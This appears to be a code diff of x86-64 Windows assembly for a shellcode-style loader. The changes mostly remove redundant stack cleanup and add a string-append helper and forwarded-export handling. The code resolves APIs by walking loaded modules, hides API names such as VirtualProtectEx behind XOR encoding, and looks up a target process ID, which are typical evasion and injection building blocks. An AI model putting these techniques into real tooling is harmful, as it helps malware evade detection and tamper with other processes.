@@ -29,8 +29,6 @@ memcpy:
     mov rsi, [rbp - 16]             ; save rsi
     mov rax, [rbp - 8]              ; return value
 
-    add rsp, 32                     ; free local variable space
-
     leave
     ret
 
@@ -65,7 +63,6 @@ strlen:
     
     mov rsi, [rbp - 16]                 ; restore rsi 
     mov rax, [rbp - 8]                  ; strlen in rax
-    add rsp, 16                         ; free local variable space
 
     leave
     ret
@@ -101,8 +98,6 @@ wstrlen:
     mov rsi, [rbp - 16]                     ; restore rsi
     mov rax, [rbp - 8]                      ; strlen in rax
     
-    add rsp, 16                             ; free local variable space
-
     leave
     ret
 
@@ -143,8 +138,6 @@ strcpy:
     mov rsi, [rbp - 16]             ; restore rsi
     mov rax, [rbp - 8]              ; return value
 
-    add rsp, 32                     ; free local variable space
-    
     leave
     ret
 
@@ -185,8 +178,6 @@ wstrcpy:
     mov rsi, [rbp - 16]             ; restore rsi
     mov rax, [rbp - 8]              ; return value
 
-    add rsp, 32                     ; free local variable space
-    
     leave
     ret
 
@@ -242,8 +233,6 @@ strcmpAW:
         mov rdi, [rbp - 24]         ; restore rdi
         mov rsi, [rbp - 16]         ; restore rsi
 
-        add rsp, 32                 ; free local variable space
-
         leave
         ret
 
@@ -294,8 +283,6 @@ strcmpiAW:
         mov rsi, [rbp - 16]         ; restore rsi
         mov rax, 1                  ; return value
 
-        add rsp, 32                 ; free local variable space
-
         leave
         ret
 
@@ -330,8 +317,6 @@ strcmpiAW:
         mov rdi, [rbp - 24]         ; restore rdi
         mov rsi, [rbp - 16]         ; restore rsi
         xor rax, rax                ; return value
-
-        add rsp, 32                 ; free local variable space
 
         leave
         ret
@@ -381,7 +366,6 @@ strcmpAA:
 
         mov rax, [rbp - 8]          ; return value
 
-        add rsp, 32                 ; free local variable space
         leave
         ret
 
@@ -431,8 +415,6 @@ strcmpiAA:
         mov rsi, [rbp - 16]         ; restore rsi
         mov rax, 1                  ; return value
 
-        add rsp, 32                 ; free local variable space
-    
         leave
         ret
 
@@ -466,8 +448,6 @@ strcmpiAA:
         mov rsi, [rbp - 16]         ; restore rsi
         xor rax, rax                ; return value
 
-        add rsp, 32                 ; free local variable space
-    
         leave
         ret
 
@@ -526,8 +506,55 @@ strchr:
     mov rbx, [rbp - 32]             ; restore rbx
     mov rax, [rbp - 8]              ; return value
 
-    add rsp, 32                     ; free shadow space
-    add rsp, 32                     ; free local variable space
+    leave
+    ret
+
+; arg0: str1            rcx
+; arg1: str2            rdx
+strappend:
+    push rbp
+    mov rbp, rsp
+
+    mov [rbp + 16], rcx                         ; str1
+    mov [rbp + 24], rdx                         ; str2
+
+    ; rbp - 8 = return value
+    ; rbp - 16 = rsi
+    ; rbp - 24 = rdi
+    ; rbp - 32 = 8 bytes padding
+    sub rsp, 32                                 ; allocate local variable space
+
+    mov [rbp - 16], rsi                         ; save rsi
+    mov [rbp - 24], rdi                         ; save rdi
+
+    mov rsi, [rbp + 16]                         ; str1
+.str1_loop:
+    lodsb
+
+    cmp al, 0                                   ; end of string ?
+    jne .str1_loop
+
+    ; end of string
+    dec rsi                                     ; to point to the trailing 0
+
+    mov rdi, rsi
+    mov rsi, [rbp + 24]                         ; str2
+
+.str2_loop:
+    lodsb
+    cmp al, 0                                   ; end of string ?
+    je .str2_loop_end
+
+    stosb
+
+    jmp .str2_loop
+
+.str2_loop_end:
+    mov byte [rdi], 0                           ; append trailing 0
+
+.shutdown:
+    mov rdi, [rbp - 24]                         ; restore rdi
+    mov rsi, [rbp - 16]                         ; restore rsi
 
     leave
     ret
@@ -659,8 +686,6 @@ my_xor:
     mov rbx, [rbp - 72]                         ; restore rbx
     mov rax, [rbp - 8]                          ; return value
 
-    add rsp, 80                                 ; free local variable space
-
     leave
     ret
 
@@ -726,9 +751,6 @@ get_kernel_module_handle:
 .loop_end_equal:
 
 .shutdown:
-    add rsp, 32                         ; free shadow space
-    add rsp, 32                         ; free local variable space
-
     mov rax, [rbp - 32]                 ; return code
 
     leave
@@ -759,8 +781,9 @@ get_proc_address_by_name:
     ; rbp - 328 = loaded forwarded library addr
     ; rbp - 336 = function name strlen
     ; rbp - 344 = rbx
-    ; rbp - 352 = 8 bytes padding
-    sub rsp, 352                            ; allocate local variable space
+    ; rbp - 472 = dll name with extension
+    ; ebp - 480 = 8 bytes padding
+    sub rsp, 480                            ; allocate local variable space
     sub rsp, 32                             ; allocate shadow space
 
     mov qword [rbp - 8], 0                  ; return value
@@ -872,9 +895,9 @@ get_proc_address_by_name:
     jg .shutdown                            ; not forwarded
 
     ; make a copy of the string of the forwarded dll
-    mov rcx, rbp
-    sub rcx, 312
-    mov rdx, [rbp - 8]
+    mov rcx, [rbp - 8]                      ; return value (proc addr)
+    mov rdx, rbp
+    sub rdx, 312                            ; dll.functionname str
     call strcpy
 
     ; find the position of the '.' which separates the dll name and function name
@@ -883,21 +906,39 @@ get_proc_address_by_name:
     mov rdx, '.'
     call strchr                             ; ptr to chr in rax
     
-    mov byte [rax], 0
+    mov byte [rax], 0                       ; replace the '.' with 0
     inc rax
 
     mov [rbp - 320], rax                    ; forwarded function name
 
+    ; copy the dll name to another part of mem, to append the .dll to pass to the loadlibrary func
     mov rcx, rbp
-    sub rcx, 312
-    call [load_library_a]                      ; library addr
+    sub rcx, 312                            ; ptr to dll name
+    mov rdx, rbp
+    sub rdx, 472                            ; ptr to dll name + ext
+    call strcpy
+
+    ; unxor .dll string
+    mov rcx, dll_xor
+    mov rdx, dll_xor.len
+    mov r8, xor_key
+    mov r9, xor_key.len
+    call my_xor
+
+    ; append the .dll to the dll name string
+    mov rcx, rbp
+    sub rcx, 472
+    mov rdx, dll_xor
+    call strappend
+    
+    mov rcx, rbp
+    sub rcx, 472                            ; ptr to dll name + ext
+    call [load_library_a]                   ; library addr
 
     mov [rbp - 328], rax                    ; library addr
 
-    sub rsp, 32
     mov rcx, [rbp - 320]
     call strlen                             ; strlen in rax
-    add rsp, 32
 
     mov [rbp - 336], rax                    ; function name strlen
 
@@ -912,16 +953,12 @@ get_proc_address_by_name:
     mov rbx, [rbp - 344]                    ; restore rbx
     mov rax, [rbp - 8]                      ; return value
 
-    add rsp, 32                             ; free shadow space
-    add rsp, 352                            ; free local variable space
-
     leave
     ret
 
 
 ; arg0: base addr               rcx
 ; arg1: proc name               rdx
-; arg2: proc name len           r8
 ;
 ; return: proc addr             rax
 get_proc_address_by_get_proc_addr:
@@ -930,7 +967,6 @@ get_proc_address_by_get_proc_addr:
 
     mov [rbp + 16], rcx                     ; base addr
     mov [rbp + 24], rdx                     ; proc name
-    mov [rbp + 32], r8                      ; proc name len
 
     ; rbp - 8 = return value
     ; rbp - 16 = 8 bytes padding
@@ -945,9 +981,6 @@ get_proc_address_by_get_proc_addr:
 
 .shutdown:
     mov rax, [rbp - 8]                      ; return value
-
-    add rsp, 32                             ; free shadow space
-    add rsp, 16                             ; free local variable space
 
     leave
     ret
@@ -972,8 +1005,8 @@ unxor_and_get_proc_addr:
     sub rsp, 16                                 ; allocate local variable space
     sub rsp, 32                                 ; allocate shadow space
 
-    mov rcx, [rbp + 24]
-    mov rdx, [rbp + 32]
+    mov rcx, [rbp + 24]                         ; xor str
+    mov rdx, [rbp + 32]                         ; xor str len
     mov r8, xor_key
     mov r9, xor_key.len
     call my_xor
@@ -999,9 +1032,6 @@ unxor_and_get_proc_addr:
 
 .shutdown:
     mov rax, [rbp - 8]                          ; return value
-
-    add rsp, 32                                 ; free shadow space
-    add rsp, 16                                 ; free local variable space
 
     leave
     ret
@@ -1111,7 +1141,6 @@ populate_kernel_function_ptrs_by_name:
 
     mov [virtual_protect], rax                  ; VirtualProtect addr
 
-
     mov rcx, [rbp + 16]
     mov rdx, virtual_protect_ex_xor
     mov r8, virtual_protect_ex_xor.len
@@ -1201,7 +1230,6 @@ populate_kernel_function_ptrs_by_name:
     mov [output_debug_string_a], rax            ; OutputDebugStringA addr
 
 .shutdown:
-    add rsp, 32                                 ; free shadow space
 
     leave
     ret
@@ -1275,9 +1303,6 @@ find_target_process_id:
 .shutdown:
     mov rax, [rbp - 8]                      ; return value
 
-    add rsp, 32                             ; free shadow space
-    add rsp, 592                            ; free local variable space
-
     leave
     ret
 
@@ -1310,7 +1335,6 @@ print_string:
     xor r9, r9
     call [write_file]
     add rsp, 16                             ; 1 arg + 8 bytes padding
-
 
 .shutdown:
 
